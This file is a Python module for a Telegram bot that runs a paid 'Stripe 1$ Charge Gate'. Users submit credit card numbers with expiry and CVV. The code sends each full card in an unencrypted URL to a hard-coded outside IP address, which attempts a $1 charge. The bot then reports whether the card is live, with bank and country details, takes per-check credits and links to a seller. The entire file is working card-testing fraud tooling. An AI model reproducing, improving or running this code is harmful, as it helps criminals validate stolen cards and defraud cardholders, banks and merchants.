"""
Stripe 1$ Charge Gate
Command: /st
Type: Charge (1$)
Mass: /mst
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import re
import asyncio
import time
import requests
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from database import get_user_credits, update_credits, get_user, update_credits, get_user
from bin import get_bin_info
from sub import get_premium_status

router = Router()
user_last_command_time = {}

STRIPE_CHARGE_ENDPOINTS = [
    "http://5.83.136.66:8085/charge?cc={cc}",
]

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            user = await asyncio.to_thread(get_user, user_id)
            if user:
                return user.get("plan", "PREMIUM")
            return "PREMIUM"
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"

def luhn_check(card_number: str) -> bool:
    total = 0
    reverse_digits = card_number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

async def process_stripe_charge(cc, mm, yy, cvv):
    start = time.time()
    
    try:
        if len(yy) == 4:
            yy = yy[-2:]
        if len(mm) == 1:
            mm = f"0{mm}"
        
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        for endpoint in STRIPE_CHARGE_ENDPOINTS:
            try:
                url = endpoint.format(cc=formatted_cc)
                resp = requests.get(url, timeout=60, verify=False)
                
                if resp.status_code == 200:
                    data = resp.json()
                    elapsed = f"{time.time() - start:.2f}s"
                    
                    approved = data.get('approved', False)
                    status = data.get('status', '').upper()
                    message = data.get('message', 'Unknown')
                    transaction_id = data.get('transaction_id')
                    amount = data.get('amount', '$1.00')
                    
                    if approved or status in ['APPROVED', 'CHARGED']:
                        return {
                            "approved": True,
                            "message": f"{message} ✅",
                            "status": "CHARGED",
                            "transaction_id": transaction_id,
                            "amount": amount,
                            "time": elapsed
                        }
                    else:
                        return {
                            "approved": False,
                            "message": f"{message} ❌",
                            "status": "DECLINED",
                            "transaction_id": transaction_id,
                            "amount": amount,
                            "time": elapsed
                        }
            except Exception as e:
                continue
        
        elapsed = f"{time.time() - start:.2f}s"
        return {
            "approved": False,
            "message": "All endpoints failed ❌",
            "status": "ERROR",
            "time": elapsed
        }
        
    except Exception as e:
        elapsed = f"{time.time() - start:.2f}s"
        return {
            "approved": False,
            "message": str(e)[:100],
            "status": "ERROR",
            "time": elapsed
        }

@router.message(Command("st"))
async def st_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    if not is_premium:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"⚠️ <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    parts = message.text.split(maxsplit=1)
    raw_text = ""
    if len(parts) > 1:
        raw_text = parts[1].strip()
    elif message.reply_to_message:
        raw_text = message.reply_to_message.text or message.reply_to_message.caption

    if not raw_text:
        await message.reply(
            "❌ <b>Usage:</b> /st <code>cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)

    if not match:
        await message.reply("❌ <b>Invalid Card Format.</b>", parse_mode="HTML")
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    if not luhn_check(cc):
        await message.reply("❌ <b>Invalid Card</b>", parse_mode="HTML")
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await message.reply("❌ <b>Insufficient Credits!</b>", parse_mode="HTML")
        return

    plan_name = await get_user_plan_name(user_id)
    proc_msg = await message.reply("<pre>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴…⏳</pre>", parse_mode="HTML")

    asyncio.create_task(
        process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name)
    )

async def process_st_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name):
    result = await process_stripe_charge(cc, formatted_cc.split('|')[1], formatted_cc.split('|')[2], formatted_cc.split('|')[3])

    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    status_raw = result.get("status", "").lower()
    res_message = result.get("message", "N/A")
    amount = result.get("amount", "$1.00")
    transaction_id = result.get("transaction_id")
    is_charged = False

    CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
    CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
    CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

    if status_raw == "charged":
        final_status = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
        is_charged = True
    elif status_raw == "approved":
        final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">💎</tg-emoji>'
        is_charged = True
    elif status_raw == "declined":
        final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
    else:
        final_status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"

    credits_to_deduct = 0
    if is_charged:
        credits_to_deduct = 2
    elif status_raw == 'declined':
        credits_to_deduct = 1

    if credits_to_deduct > 0:
        current_balance = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = current_balance - credits_to_deduct
        if new_balance < 0:
            new_balance = 0
        await asyncio.to_thread(update_credits, user_id, new_balance)

    user_link = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
    dev_link = '<a href="https://t.me/npnbit4">npnbit4</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"

    txn_display = f"<code>{transaction_id}</code>" if transaction_id else "N/A"

    final_caption = (
        f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {final_status}\n"
        f"𝗖𝗮𝗿𝗱 ➛ <code>{formatted_cc}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭$\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{res_message}</b>\n"
        f"𝗔𝗺𝗼𝘂𝗻𝘁 ➛ {amount}\n"
        f"𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 ➛ {txn_display}\n"
        f"𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"𝗗𝗲𝘃 ➛ {dev_link}"
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

    try:
        await proc_msg.edit_text(text=final_caption, parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        await message.reply(text=final_caption, parse_mode="HTML", reply_markup=reply_markup)
